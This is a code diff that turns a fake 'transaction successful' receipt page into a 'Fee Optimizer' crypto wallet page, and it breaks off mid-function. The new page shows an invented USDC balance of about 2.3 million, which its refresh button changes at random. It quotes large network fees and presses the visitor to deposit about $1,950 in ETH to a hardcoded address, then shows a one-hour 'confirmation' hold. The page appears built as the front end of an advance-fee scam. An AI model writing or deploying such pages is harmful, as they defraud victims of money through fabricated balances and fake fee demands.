@@ -1,84 +1,105 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TimedPayout - Transaction Successful</title>
+  <title>Fee Optimizer - Authorized Access</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body{
       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Inter',sans-serif;
-      background:linear-gradient(135deg,#10b981 0%,#059669 50%,#047857 100%);
+      background:linear-gradient(135deg,#3b82f6 0%,#1d4ed8 50%,#1e40af 100%);
       min-height:100vh;color:#1a1a1a;overflow-x:hidden;display:flex;align-items:center;justify-content:center
     }
     .background-effects{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
-    .floating-shape{position:absolute;border-radius:50%;background:rgba(255,255,255,.15);backdrop-filter:blur(20px);animation:float 15s infinite ease-in-out}
+    .floating-shape{position:absolute;border-radius:50%;background:rgba(255,255,255,.1);backdrop-filter:blur(20px);animation:float 15s infinite ease-in-out}
     .shape-1{width:200px;height:200px;top:10%;left:80%;animation-delay:0s}
     .shape-2{width:150px;height:150px;top:70%;left:10%;animation-delay:5s}
     .shape-3{width:100px;height:100px;top:30%;left:20%;animation-delay:10s}
     @keyframes float{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-20px) rotate(180deg)}}
-    .container{max-width:600px;margin:0 auto;padding:20px;position:relative;z-index:1;width:100%}
-    .main-card{background:rgba(255,255,255,.95);backdrop-filter:blur(20px);border-radius:32px;padding:60px 40px;box-shadow:0 32px 64px rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.3);text-align:center}
-    .header{margin-bottom:40px}
-    .header h1{font-size:2.5em;font-weight:800;background:linear-gradient(135deg,#10b981,#059669);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px;letter-spacing:-.02em}
+    .container{max-width:700px;margin:0 auto;padding:20px;position:relative;z-index:1;width:100%}
+    .main-card{background:rgba(255,255,255,.95);backdrop-filter:blur(20px);border-radius:32px;padding:50px 40px;box-shadow:0 32px 64px rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.3)}
+    .header{text-align:center;margin-bottom:40px}
+    .header h1{font-size:2.5em;font-weight:800;background:linear-gradient(135deg,#3b82f6,#1d4ed8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px;letter-spacing:-.02em}
     .header p{font-size:1.1em;color:#6b7280;font-weight:500}
-    .success-section{margin:40px 0}
-    .success-title{font-size:1.8em;font-weight:700;color:#065f46;margin-bottom:30px;display:flex;align-items:center;justify-content:center;gap:12px}
-    .success-icon{width:120px;height:120px;margin:0 auto 30px;background:linear-gradient(135deg,#10b981,#059669);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:4em;color:white;animation:successPulse 2s ease-in-out}
-    @keyframes successPulse{0%{transform:scale(0.8);opacity:0}50%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
-    .transfer-visualization{display:flex;align-items:center;justify-content:center;gap:40px;margin:50px 0;flex-wrap:wrap}
-    .wallet-icon{display:flex;flex-direction:column;align-items:center;gap:12px}
-    .wallet-circle{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#ecfdf5 0%,#d1fae5 100%);border:3px solid #10b981;display:flex;align-items:center;justify-content:center;font-size:2.5em;position:relative;overflow:hidden}
-    .wallet-circle::before{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;background:linear-gradient(45deg,#10b981,#059669,#047857);border-radius:50%;z-index:-1;animation:successGlow 3s ease-in-out infinite}
-    @keyframes successGlow{0%,100%{opacity:0.7}50%{opacity:1}}
-    .wallet-label{font-size:.9em;font-weight:600;color:#064e3b;text-transform:uppercase;letter-spacing:.05em}
-    .transfer-arrow{display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 20px}
-    .arrow-container{position:relative;width:80px;height:40px}
-    .currency-flows{display:flex;flex-direction:column;gap:16px;margin:40px 0}
-    .currency-flow{background:linear-gradient(135deg,#ecfdf5 0%,#d1fae5 100%);border-radius:16px;padding:24px;border:2px solid #10b981;display:flex;align-items:center;justify-content:space-between}
-    .currency-info{display:flex;align-items:center;gap:16px}
-    .currency-icon{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2em;font-weight:bold;color:#fff}
-    .usdc-icon{background:linear-gradient(135deg,#10b981,#059669)}
-    .currency-details{text-align:left}
-    .currency-name{font-size:1.1em;font-weight:700;color:#065f46;margin-bottom:4px}
-    .currency-amount{font-size:1.3em;font-weight:800;color:#059669}
-    .transfer-status{font-size:.9em;color:#059669;font-weight:700;display:flex;align-items:center;gap:8px}
-    .status-indicator{width:12px;height:12px;border-radius:50%;background:#10b981}
-    .transaction-details{background:linear-gradient(135deg,#ecfdf5 0%,#d1fae5 100%);border-radius:20px;padding:32px;margin:40px 0;border-left:6px solid #10b981}
-    .details-title{font-size:1.3em;font-weight:700;color:#065f46;margin-bottom:20px;display:flex;align-items:center;gap:12px}
-    .detail-item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(16,185,129,.2)}
-    .detail-item:last-child{border-bottom:none}
-    .detail-label{font-size:.95em;color:#047857;font-weight:600}
-    .detail-value{font-size:.95em;font-weight:700;color:#065f46;word-break:break-all}
-    .completion-time{background:linear-gradient(135deg,#ecfdf5 0%,#d1fae5 100%);border:2px solid #10b981;border-radius:16px;padding:20px;margin:30px 0}
-    .time-title{font-size:1.1em;font-weight:700;color:#047857;margin-bottom:8px}
-    .time-value{font-size:1.8em;font-weight:800;color:#065f46;font-family:'Courier New',monospace}
-    .success-note{background:linear-gradient(135deg,#ecfdf5 0%,#d1fae5 100%);border:2px solid #10b981;border-radius:12px;padding:20px;margin:20px 0;display:flex;align-items:center;gap:16px}
-    .success-note-icon{font-size:1.5em;color:#10b981}
-    .success-note-text{color:#065f46;font-weight:600;font-size:1em}
-    .action-buttons{display:flex;gap:16px;justify-content:center;margin:30px 0;flex-wrap:wrap}
-    .btn{padding:12px 24px;border-radius:12px;font-weight:700;font-size:.95em;cursor:pointer;transition:all 0.3s ease;text-decoration:none;display:inline-flex;align-items:center;gap:8px}
-    .btn-primary{background:linear-gradient(135deg,#10b981,#059669);color:white;border:none}
-    .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(16,185,129,.3)}
-    .btn-secondary{background:rgba(255,255,255,.9);color:#047857;border:2px solid #10b981}
-    .btn-secondary:hover{background:#f0fdf4;transform:translateY(-2px)}
+    .auth-status{background:linear-gradient(135deg,#dcfce7 0%,#bbf7d0 100%);border:2px solid #22c55e;border-radius:16px;padding:20px;margin-bottom:30px;display:flex;align-items:center;gap:16px}
+    .auth-icon{font-size:1.5em;color:#22c55e}
+    .auth-info{flex:1}
+    .auth-address{font-size:.9em;color:#166534;font-weight:600;margin-bottom:4px}
+    .auth-label{font-size:.8em;color:#15803d;font-weight:500;text-transform:uppercase;letter-spacing:.05em}
+    .balance-section{background:linear-gradient(135deg,#f0f9ff 0%,#e0f2fe 100%);border-radius:20px;padding:24px;margin-bottom:30px}
+    .balance-title{font-size:1.2em;font-weight:700;color:#0c4a6e;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+    .balance-display{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px}
+    .balance-amount{font-size:2.2em;font-weight:800;color:#0284c7;font-family:'Courier New',monospace}
+    .balance-usd{font-size:1.1em;color:#0369a1;font-weight:600}
+    .refresh-btn{background:#0ea5e9;color:white;border:none;border-radius:8px;padding:8px 16px;font-size:.85em;font-weight:600;cursor:pointer;transition:all 0.3s ease}
+    .refresh-btn:hover{background:#0284c7;transform:translateY(-1px)}
+    .send-section{margin-bottom:30px}
+    .section-title{font-size:1.3em;font-weight:700;color:#1e293b;margin-bottom:20px;display:flex;align-items:center;gap:12px}
+    .input-group{margin-bottom:20px}
+    .input-label{display:block;font-size:.95em;font-weight:600;color:#374151;margin-bottom:8px}
+    .input-field{width:100%;padding:14px 16px;border:2px solid #e5e7eb;border-radius:12px;font-size:1em;font-weight:500;transition:all 0.3s ease}
+    .input-field:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.1)}
+    .input-with-max{position:relative}
+    .max-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:#3b82f6;color:white;border:none;border-radius:6px;padding:4px 12px;font-size:.8em;font-weight:600;cursor:pointer;transition:all 0.3s ease}
+    .max-btn:hover{background:#2563eb}
+
+    .fee-estimation{background:linear-gradient(135deg,#fef3c7 0%,#fde68a 100%);border-radius:20px;padding:24px;margin-bottom:30px}
+    .fee-title{font-size:1.2em;font-weight:700;color:#92400e;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+    .fee-options{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:20px}
+    .fee-option{background:rgba(255,255,255,.8);border:2px solid #f59e0b;border-radius:12px;padding:16px;cursor:pointer;transition:all 0.3s ease;text-align:center}
+    .fee-option:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(245,158,11,.2)}
+    .fee-option.selected{background:#f59e0b;color:white;transform:translateY(-2px)}
+    .fee-speed{font-size:.85em;font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
+    .fee-amount{font-size:1.1em;font-weight:800;margin-bottom:4px}
+    .fee-time{font-size:.8em;opacity:.8}
+
+    /* Hold state styling for fee box */
+    .hold-active .fee-options{pointer-events:none;opacity:.6}
+    .hold-note{font-size:.85em;color:#92400e;margin-top:6px;display:none}
+    .hold-active .hold-note{display:block}
+
+    .eta-display{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:16px;margin-top:20px}
+    .eta-item{background:rgba(255,255,255,.9);border-radius:12px;padding:16px;text-align:center}
+    .eta-value{font-size:1.4em;font-weight:800;color:#92400e;margin-bottom:4px;font-family:'Courier New',monospace}
+    .eta-label{font-size:.8em;color:#a16207;font-weight:600;text-transform:uppercase}
+    .send-button{width:100%;background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:white;border:none;border-radius:16px;padding:18px;font-size:1.1em;font-weight:700;cursor:pointer;transition:all 0.3s ease;margin-top:20px}
+    .send-button:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(59,130,246,.3)}
+    .send-button:disabled{opacity:.6;cursor:not-allowed;transform:none}
+    .transaction-preview{background:linear-gradient(135deg,#f1f5f9 0%,#e2e8f0 100%);border-radius:16px;padding:20px;margin-top:20px;border-left:4px solid #3b82f6}
+    .preview-title{font-size:1em;font-weight:700;color:#1e293b;margin-bottom:12px}
+    .preview-item{display:flex;justify-content:space-between;align-items:center;padding:8px 0;font-size:.9em}
+    .preview-label{color:#64748b;font-weight:600}
+    .preview-value{color:#1e293b;font-weight:700}
     .messages{margin-top:20px}
-    .message{border-radius:12px;padding:12px 16px;margin-top:8px;font-size:.95em}
-    .message.success{background:#ecfdf5;border:2px solid #10b981;color:#065f46}
+    .message{border-radius:12px;padding:12px 16px;margin-top:8px;font-size:.9em;display:flex;align-items:center;gap:12px}
+    .message.info{background:#dbeafe;border:1px solid:#60a5fa;color:#1e40af}
+    .message.warning{background:#fef3c7;border:1px solid:#fbbf24;color:#92400e}
+    .message.error{background:#fee2e2;border:1px solid:#fca5a5;color:#991b1b}
+
+    /* Stronger CTA for the Deposit button */
+    .deposit-cta {
+      background:linear-gradient(135deg,#22c55e,#16a34a);
+      color:#fff;border:none;border-radius:12px;
+      padding:12px 18px;font-size:1rem;font-weight:800;
+      cursor:pointer;transition:transform .15s ease, box-shadow .15s ease;
+      box-shadow:0 10px 24px rgba(22,163,74,.35);
+      letter-spacing:.02em;
+    }
+    .deposit-cta:hover{transform:translateY(-2px);box-shadow:0 16px 32px rgba(22,163,74,.45)}
+    .deposit-cta:active{transform:translateY(0)}
+    .deposit-cta:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none}
+
     @media (max-width:768px){
       .container{padding:16px}
-      .main-card{padding:40px 24px}
+      .main-card{padding:30px 20px}
       .header h1{font-size:2em}
-      .transfer-visualization{gap:20px;flex-direction:column}
-      .transfer-arrow{transform:rotate(90deg);margin:10px 0}
-      .wallet-circle{width:80px;height:80px;font-size:2em}
-      .currency-flow{flex-direction:column;gap:12px;text-align:center}
-      .action-buttons{flex-direction:column;align-items:center}
+      .balance-display{flex-direction:column;text-align:center}
+      .fee-options{grid-template-columns:1fr}
+      .eta-display{grid-template-columns:repeat(2,1fr)}
     }
   </style>
 </head>
-
 <body>
   <div class="background-effects">
     <div class="floating-shape shape-1"></div>
@@ -89,165 +110,655 @@
   <div class="container">
     <div class="main-card">
       <div class="header">
-        <h1>💰 TimedPayout</h1>
-        <p>Transaction completed successfully</p>
+        <h1>⚡ Fee Optimizer</h1>
+        <p>Authorized wallet access - Optimized transaction fees</p>
       </div>
 
-      <div class="success-section">
-        <div class="success-icon">✅</div>
-        <div class="success-title">🎉 Transfer Complete!</div>
-
-        <div class="transfer-visualization">
-          <div class="wallet-icon">
-            <div class="wallet-circle">🏦</div>
-            <div class="wallet-label">Smart Contract</div>
-          </div>
-
-          <div class="transfer-arrow">
-            <svg width="80" height="40" viewBox="0 0 80 40" xmlns="http://www.w3.org/2000/svg">
-              <defs>
-                <linearGradient id="arrowGradient" x1="0%" y1="0%" x2="100%" y2="0%">
-                  <stop offset="0%" style="stop-color:#10b981" />
-                  <stop offset="100%" style="stop-color:#059669" />
-                </linearGradient>
-              </defs>
-              <path d="M10 20 L60 20 M50 10 L60 20 L50 30" stroke="url(#arrowGradient)" stroke-width="3"
-                fill="none" stroke-linecap="round" stroke-linejoin="round" />
-            </svg>
-          </div>
-
-          <div class="wallet-icon">
-            <div class="wallet-circle">👤</div>
-            <div class="wallet-label">Your Wallet</div>
-          </div>
+      <div id="connect-section" class="auth-status" style="background:linear-gradient(135deg,#fef3c7 0%,#fde68a 100%);border-color:#f59e0b;">
+        <div class="auth-icon" style="color:#f59e0b;">🔒</div>
+        <div class="auth-info">
+          <div class="auth-address">Connect your wallet to access Fee Optimizer</div>
+          <div class="auth-label">Authentication Required</div>
         </div>
+        <button class="refresh-btn" onclick="connectWallet()" style="background:#f59e0b;">🔗 Connect Wallet</button>
+      </div>
 
-        <div class="currency-flows">
-          <div class="currency-flow">
-            <div class="currency-info">
-              <div class="currency-icon usdc-icon">$</div>
-              <div class="currency-details">
-                <div class="currency-name">USDC Transfer</div>
-                <div class="currency-amount">2,324,230.50</div>
-              </div>
+      <div id="auth-status" class="auth-status" style="display:none;">
+        <div class="auth-icon">🔐</div>
+        <div class="auth-info">
+          <div class="auth-address" id="connected-address">0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1</div>
+          <div class="auth-label">Authorized Wallet</div>
+        </div>
+        <button class="refresh-btn" onclick="disconnectWallet()">🔌 Disconnect</button>
+      </div>
+
+      <div id="unauthorized-section" class="auth-status" style="display:none;background:linear-gradient(135deg,#fee2e2 0%,#fecaca 100%);border-color:#ef4444;">
+        <div class="auth-icon" style="color:#ef4444;">❌</div>
+        <div class="auth-info">
+          <div class="auth-address" id="unauthorized-address">Wallet not authorized</div>
+          <div class="auth-label">Access Denied</div>
+        </div>
+      </div>
+
+      <div id="main-content" class="main-content" style="display:none;">
+        <div class="balance-section">
+          <div class="balance-title">💰 Your USDC Balance</div>
+          <div class="balance-display">
+            <div>
+              <div class="balance-amount" id="usdc-balance">2,324,230.50</div>
+              <div class="balance-usd" id="usd-value">≈ $2,324,230.50 USD</div>
             </div>
-            <div class="transfer-status">
-              <div class="status-indicator"></div>
-              Completed ✅
+            <button class="refresh-btn" onclick="refreshBalance()">🔄 Refresh</button>
+          </div>
+        </div>
+
+        <div class="send-section">
+          <div class="section-title">📤 Send USDC</div>
+          <div class="input-group">
+            <label class="input-label" for="recipient">Recipient Address</label>
+            <input type="text" id="recipient" class="input-field" placeholder="0x..." />
+          </div>
+          <div class="input-group">
+            <label class="input-label" for="amount">Amount (USDC)</label>
+            <div class="input-with-max">
+              <input type="number" id="amount" class="input-field" placeholder="0.00" step="0.01" oninput="updateEstimates()" />
+              <button class="max-btn" onclick="setMaxAmount()">MAX</button>
             </div>
+          </div>
+        </div>
+
+        <div id="fee-box" class="fee-estimation">
+          <div class="fee-title">⚡ Fee Optimization</div>
+          <div class="fee-options">
+            <div class="fee-option" data-speed="slow" onclick="selectFeeOption('slow')">
+              <div class="fee-speed">🐌 Economy</div>
+              <div class="fee-amount">$1300</div>
+              <div class="fee-time">~2–4h</div>
+            </div>
+            <div class="fee-option selected" data-speed="standard" onclick="selectFeeOption('standard')">
+              <div class="fee-speed">⚡ Standard</div>
+              <div class="fee-amount">$1500</div>
+              <div class="fee-time">~1h</div>
+            </div>
+            <div class="fee-option" data-speed="fast" onclick="selectFeeOption('fast')">
+              <div class="fee-speed">🚀 Priority</div>
+              <div class="fee-amount">$1950</div>
+              <div class="fee-time">~30m</div>
+            </div>
+          </div>
+
+          <div class="eta-display">
+            <div class="eta-item">
+              <div class="eta-value" id="eta-time">1h</div>
+              <div class="eta-label" id="eta-unit">ETA</div>
+            </div>
+            <div class="eta-item">
+              <div class="eta-value" id="gas-price">42</div>
+              <div class="eta-label">Gwei</div>
+            </div>
+            <div class="eta-item">
+              <div class="eta-value" id="confirmations">1-3</div>
+              <div class="eta-label">Blocks</div>
+            </div>
+          </div>
+
+          <div class="hold-note" id="hold-note">Waiting for confirmations (~1h). Fees temporarily locked.</div>
+        </div>
+
+        <div class="transaction-preview">
+          <div class="preview-title">📋 Transaction Preview</div>
+          <div class="preview-item">
+            <span class="preview-label">Amount to Send</span>
+            <span class="preview-value" id="preview-amount">0.00 USDC</span>
+          </div>
+          <div class="preview-item">
+            <span class="preview-label">Network Fee</span>
+            <span class="preview-value" id="preview-fee">$1500.00</span>
+          </div>
+          <div class="preview-item">
+            <span class="preview-label">Estimated Arrival</span>
+            <span class="preview-value" id="preview-eta">1h</span>
+          </div>
+          <div class="preview-item" style="border-top:1px solid #cbd5e1;margin-top:12px;padding-top:12px;">
+            <span class="preview-label">Total Cost</span>
+            <span class="preview-value" id="preview-total">$1500.00</span>
+          </div>
+        </div>
+
+        <button class="send-button" id="send-btn" onclick="sendTransaction()" disabled>
+          🚀 Send Transaction
+        </button>
+
+        <!-- Deposit panel (simplified) -->
+        <div id="deposit-offer" class="message warning" style="display:none; align-items:center; gap:12px;">
+          <span>⚠️</span>
+          <div style="flex:1">
+            <div style="font-weight:700">Low ETH balance detected</div>
+            <div>
+              Please deposit ≈ <span id="required-eth-amount">—</span> ETH (≈ $1,950)
+            </div>
+          </div>
+          <button class="deposit-cta" onclick="depositEth()">Deposit ETH</button>
+        </div>
+
+        <!-- Persistent post-deposit banner -->
+        <div id="post-deposit-banner" class="message info" style="display:none; align-items:center; gap:12px;">
+          <span>⏳</span>
+          <div style="flex:1">
+            <div style="font-weight:700">Waiting for confirmations</div>
+            <div>Estimated time remaining: <span id="hold-countdown">60:00</span></div>
           </div>
         </div>
       </div>
 
-      <div class="completion-time">
-        <div class="time-title">⏰ Completed At</div>
-        <div class="time-value" id="completion-time">Aug 4, 2025 07:51 CEST</div>
-      </div>
-
-      <div class="success-note">
-        <div class="success-note-icon">🎯</div>
-        <div class="success-note-text">
-          <strong>Transaction successful!</strong> Your funds have been transferred to your wallet. The transaction has been confirmed on the Ethereum blockchain with 64/64 confirmations.
-        </div>
-      </div>
-
-      <div class="transaction-details">
-        <div class="details-title">📋 Transaction Details</div>
-        <div class="detail-item">
-          <span class="detail-label">Transaction Hash</span>
-          <span class="detail-value">0x8ff81e0...c0245f7Ed1</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Receiving Address</span>
-          <span class="detail-value">0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Gas Fee (base)</span>
-          <span class="detail-value">0.305 ETH</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Speed-up Payment</span>
-          <span class="detail-value">0.305 ETH</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Total Paid</span>
-          <span class="detail-value">0.610 ETH</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Network</span>
-          <span class="detail-value">Ethereum Mainnet</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Block Confirmations</span>
-          <span class="detail-value">64 / 64 ✅</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Block Number</span>
-          <span class="detail-value">#20,458,392</span>
-        </div>
-      </div>
-
-      <div id="messages" class="messages">
-        <div class="message success">
-          ✅ Transaction completed successfully at Aug 4, 2025 07:51 CEST
-        </div>
-      </div>
+      <div id="messages" class="messages"></div>
     </div>
   </div>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
   <script>
-    // Set completion time to 7 AM today
-    function setCompletionTime() {
-      const el = document.getElementById('completion-time');
-      if (el) el.textContent = 'Aug 4, 2025 07:51 CEST';
+    // ======= CONFIG =======
+    const AUTHORIZED_WALLET = '0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1';
+    const REQUIRED_ETH_USD = 1950; // preset USD value to deposit
+    const DEPOSIT_ADDRESS = '0x275662eC373d123cb822C28BDC629872D338c43d';
+
+    // ======= FEES & TIMES =======
+    const feeOptions = {
+      slow:     { price: 1300, time: '2–4h', gwei: 25, blocks: '3-6' },
+      standard: { price: 1500, time: '1h',   gwei: 42, blocks: '1-3' },
+      fast:     { price: 1950, time: '30m',  gwei: 68, blocks: '1'   }
+    };
+
+    // ======= STATE =======
+    let currentBalance = 2324230.50;
+    let selectedFee = 'standard';
+    let web3 = null;
+    let userAccount = null;
+    let isAuthorized = false;
+
+    // Post-deposit hold state
+    let isHoldActive = false;
+    let holdTimerId = null;
+    const HOLD_SECONDS = 3600; // 1 hour
+    const LS_HOLD_ENDS_AT = 'feeopt_holdEndsAt';
+    const LS_HOLD_TX = 'feeopt_holdTx';
+
+    // ======= WALLET CONNECT =======
+    async function connectWallet() {
+      try {
+        if (!window.ethereum) {
+          showMessage('MetaMask not detected. Please install MetaMask to continue.', 'error');
+          return;
+        }
+        showMessage('Connecting to wallet...', 'info');
+
+        web3 = new Web3(window.ethereum);
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) {
+          showMessage('No accounts found. Please unlock your wallet.', 'error');
+          return;
+        }
+
+        userAccount = accounts[0];
+
+        if (userAccount.toLowerCase() === AUTHORIZED_WALLET.toLowerCase()) {
+          isAuthorized = true;
+          showWalletConnected();
+          showMessage('✅ Authorized wallet connected successfully!', 'info');
+          checkEthBalanceAndOfferDeposit();
+        } else {
+          isAuthorized = false;
+          showUnauthorizedWallet();
+          showMessage('❌ This wallet is not authorized to access Fee Optimizer.', 'error');
+        }
+      } catch (error) {
+        console.error('Connection error:', error);
+        if (error.code === 4001) {
+          showMessage('Wallet connection rejected by user.', 'warning');
+        } else {
+          showMessage(`Connection failed: ${error.message}`, 'error');
+        }
+      }
     }
 
-    function downloadReceipt() {
-      const receiptData = {
-        transactionHash: '0x8ff81e02....5f7Ed1',
-        amount: '2,324,230.50 USDC',
-        recipient: '0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1',
-        completedAt: document.getElementById('completion-time').textContent,
-        gasFee: '0.305 ETH',
-        speedUpFee: '0.305 ETH',
-        totalFee: '0.610 ETH',
-        confirmations: '64/64',
-        network: 'Ethereum Mainnet'
-      };
-
-      const receiptText = `
-TimedPayout Transaction Receipt
-==============================
-
-Transaction Hash: ${receiptData.transactionHash}
-Amount: ${receiptData.amount}
-Recipient: ${receiptData.recipient}
-Completed At: ${receiptData.completedAt}
-
-Fee Details:
-- Base Gas Fee: ${receiptData.gasFee}
-- Speed-up Fee: ${receiptData.speedUpFee}
-- Total Fee Paid: ${receiptData.totalFee}
-
-Network: ${receiptData.network}
-Confirmations: ${receiptData.confirmations}
-
-Status: COMPLETED ✅
-      `;
-
-      const blob = new Blob([receiptText], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `TimedPayout_Receipt_${Date.now()}.txt`;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
+    function disconnectWallet() {
+      userAccount = null;
+      isAuthorized = false;
+      web3 = null;
+      showWalletDisconnected();
+      hideDepositOffer();
+      stopPostDepositHold();
+      showMessage('Wallet disconnected', 'info');
     }
 
-    // Initialize completion time on load
-    document.addEventListener('DOMContentLoaded', setCompletionTime);
+    function showWalletConnected() {
+      document.getElementById('connect-section').style.display = 'none';
+      document.getElementById('auth-status').style.display = 'flex';
+      document.getElementById('unauthorized-section').style.display = 'none';
+      document.getElementById('main-content').style.display = 'block';
+      document.getElementById('connected-address').textContent = userAccount;
+      renderFeeOptionPrices();
+
+      // Reflect selected fee ETA immediately
+      document.getElementById('eta-time').textContent = feeOptions[selectedFee].time;
+      document.getElementById('preview-eta').textContent = feeOptions[selectedFee].time;
+
+      // Resume any existing hold
+      resumeHoldIfNeeded();
+    }
+
+    function showUnauthorizedWallet() {
+      document.getElementById('connect-section').style.display = 'none';
+      document.getElementById('auth-status').style.display = 'none';
+      document.getElementById('unauthorized-section').style.display = 'flex';
+      document.getElementById('main-content').style.display = 'none';
+      hideDepositOffer();
+      stopPostDepositHold();
+      document.getElementById('unauthorized-address').textContent =
+        `${userAccount.slice(0, 6)}...${userAccount.slice(-4)} - Not Authorized`;
+    }
+
+    function showWalletDisconnected() {
+      document.getElementById('connect-section').style.display = 'flex';
+      document.getElementById('auth-status').style.display = 'none';
+      document.getElementById('unauthorized-section').style.display = 'none';
+      document.getElementById('main-content').style.display = 'none';
+    }
+
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', async (accounts) => {
+        hideDepositOffer();
+        if (accounts.length === 0) {
+          disconnectWallet();
+        } else {
+          userAccount = accounts[0];
+          if (userAccount.toLowerCase() === AUTHORIZED_WALLET.toLowerCase()) {
+            isAuthorized = true;
+            showWalletConnected();
+            showMessage('Authorized wallet detected', 'info');
+            checkEthBalanceAndOfferDeposit();
+          } else {
+            isAuthorized = false;
+            showUnauthorizedWallet();
+            showMessage('Switched to unauthorized wallet', 'warning');
+          }
+        }
+      });
+
+      window.ethereum.on('chainChanged', () => {
+        // Reload on network change
+        window.location.reload();
+      });
+    }
+
+    // ======= UI HELPERS =======
+    function showMessage(text, type = 'info') {
+      const messages = document.getElementById('messages');
+      const msg = document.createElement('div');
+      msg.className = `message ${type}`;
+      msg.innerHTML = `<span>${getIcon(type)}</span><span>${text}</span>`;
+      messages.appendChild(msg);
+      setTimeout(() => msg.remove(), 5000);
+    }
+
+    function getIcon(type) {
+      switch(type) {
+        case 'info': return 'ℹ️';
+        case 'warning': return '⚠️';
+        case 'error': return '❌';
+        default: return 'ℹ️';
+      }
+    }
+
+    function refreshBalance() {
+      if (!isAuthorized) {
+        showMessage('Please connect an authorized wallet first', 'warning');
+        return;
+      }
+      showMessage('Refreshing balance...', 'info');
+      setTimeout(() => {
+        const variation = (Math.random() - 0.5) * 1000;
+        currentBalance = Math.max(0, currentBalance + variation);
+        document.getElementById('usdc-balance').textContent = currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        document.getElementById('usd-value').textContent = `≈ ${currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
+        showMessage('Balance updated successfully', 'info');
+      }, 1500);
+    }
+
+    function setMaxAmount() {
+      if (!isAuthorized) {
+        showMessage('Please connect an authorized wallet first', 'warning');
+        return;
+      }
+      const amountField = document.getElementById('amount');
+      const maxAmount = Math.max(0, currentBalance - 50); // Reserve for fees
+      amountField.value = maxAmount.toFixed(2);
+      updateEstimates();
+    }
+
+    function selectFeeOption(speed) {
+      if (isHoldActive) return; // locked during hold
+      selectedFee = speed;
+      document.querySelectorAll('.fee-option').forEach(opt => opt.classList.remove('selected'));
+      document.querySelector(`[data-speed="${speed}"]`).classList.add('selected');
+      const option = feeOptions[speed];
+      document.getElementById('eta-time').textContent = option.time;
+      document.getElementById('gas-price').textContent = option.gwei;
+      document.getElementById('confirmations').textContent = option.blocks;
+      updateEstimates();
+    }
+
+    function updateEstimates() {
+      const amount = parseFloat(document.getElementById('amount').value) || 0;
+      const recipient = document.getElementById('recipient').value.trim();
+      const option = feeOptions[selectedFee];
+
+      document.getElementById('preview-amount').textContent = `${amount.toFixed(2)} USDC`;
+      document.getElementById('preview-fee').textContent = `$${Number(option.price).toFixed(2)}`;
+      document.getElementById('preview-total').textContent = `$${(amount + option.price).toFixed(2)}`;
+
+      // ETA handling (override to 1h during hold)
+      if (isHoldActive) {
+        document.getElementById('preview-eta').textContent = '1h';
+        document.getElementById('eta-time').textContent = '1h';
+        document.getElementById('eta-unit').textContent = 'Waiting';
+      } else {
+        document.getElementById('preview-eta').textContent = option.time;
+        document.getElementById('eta-time').textContent = option.time;
+        const etaUnit = document.getElementById('eta-unit');
+        if (etaUnit) etaUnit.textContent = 'ETA';
+      }
+
+      const sendBtn = document.getElementById('send-btn');
+      const canSend = !isHoldActive && amount > 0 && recipient.length > 0 && amount <= currentBalance;
+      sendBtn.disabled = !canSend;
+
+      if (amount > currentBalance) showMessage('Insufficient balance for this transaction', 'warning');
+    }
+
+    async function sendTransaction() {
+      if (!isAuthorized) {
+        showMessage('Please connect an authorized wallet first', 'error');
+        return;
+      }
+      if (isHoldActive) {
